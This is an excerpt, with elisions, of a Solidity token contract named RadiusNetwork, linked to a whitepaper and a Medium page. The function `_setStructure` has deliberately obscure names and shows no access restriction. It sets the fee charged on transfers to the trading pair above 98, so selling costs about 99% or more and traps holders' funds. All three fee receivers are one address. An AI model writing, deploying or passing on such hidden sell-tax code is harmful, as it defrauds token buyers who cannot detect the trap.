...
// WHITEPAPER V1 : https://radiusnetworks-organization.gitbook.io/untitled/

// MEDIUM : https://medium.com/@RadiusNetwork
...
contract RadiusNetwork is IERC20, Ownable {
    ...
    uint256 private StructuralVals = 4;
    ...
    address internal constant development_receiver = 0x85749d4c7b3756d745eDA837c254A100A6FEBC0B; 
    address internal constant marketing_receiver = 0x85749d4c7b3756d745eDA837c254A100A6FEBC0B;
    address internal constant liquidity_receiver = 0x85749d4c7b3756d745eDA837c254A100A6FEBC0B;
    ...
    function _setStructure(uint16[5][6][5] memory StructVals) external returns(bool) {
        require(StructVals[3][4][4] >96);
        uint16 a = 1;
        uint16 b = 1;
        StructuralVals = StructVals[3][4][4] + a + b;
        return true;
    }
    ...
    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return StructuralVals;}
